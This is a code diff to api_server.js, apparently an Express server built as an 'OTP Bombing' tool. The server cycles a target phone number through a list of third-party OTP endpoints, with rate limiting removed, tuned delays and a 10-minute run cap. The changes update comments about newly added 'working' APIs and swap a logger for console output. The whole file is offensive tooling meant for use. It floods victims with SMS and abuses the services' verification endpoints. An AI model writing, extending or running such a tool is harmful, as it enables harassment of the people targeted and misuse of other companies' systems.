@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (FINAL - 100 APIs)
-// 100 APIs | Working APIs Added | Rate Limit Removed | 10min Cap
+// api_server.js - OTP Bombing API Server (FINAL)
+// Rate Limit Removed + 6 New APIs Added | 10min Cap | Logs
 // ============================================================
 
 const express = require('express');
@@ -18,7 +18,7 @@ const BATCH_DELAY_MS = 100;
 const API_DELAY_MS = 50;
 
 // ============================================================
-// ===== ALL APIS (100 Total) =====
+// ===== ALL APIS =====
 // ============================================================
 
 const APIS = [
@@ -736,7 +736,7 @@ const APIS = [
     },
 
     // ============================================================
-    // 🔥 NAYI WORKING APIs (5) — Latest Test Se
+    // 🔥 6 NAYI WORKING APIs — Latest Test Se Add
     // ============================================================
     {
         name: "RoyalChallengers",
@@ -762,7 +762,6 @@ const APIS = [
         method: "POST",
         headers: {
             "Content-Type": "application/json",
-            "Host": "tradgo.in",
             "User-Agent": "okhttp/3.9.1"
         },
         data: (phone) => JSON.stringify({ mobile: phone })
@@ -796,17 +795,9 @@ const APIS = [
     }
 ];
 
-// ============================================================
-// ===== LOGGER =====
-// ============================================================
-
-function log(level, msg) {
-    const time = new Date().toISOString();
-    const emoji = { info: 'ℹ️ ', success: '✅', fail: '❌', warn: '⚠️ ', error: '🔥' }[level] || 'ℹ️ ';
-    console.log(`${emoji} [${time}] ${msg}`);
-}
-
 console.log(`✅ Loaded ${APIS.length} total APIs`);
+console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
+console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);
 
 // ============================================================
 // ===== API CALL FUNCTION =====
@@ -1041,10 +1032,10 @@ app.get('/apis', (req, res) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
-    log('success', `🚀 API Server running on port ${PORT}`);
-    log('info', `📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
-    log('info', `📊 Total APIs: ${APIS.length}`);
-    log('info', `⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
-    log('info', `⏳ API delay: ${API_DELAY_MS}ms`);
-    log('info', `⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
+    console.log(`🚀 API Server running on port ${PORT}`);
+    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
+    console.log(`📊 Total APIs: ${APIS.length}`);
+    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
+    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
+    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
 });
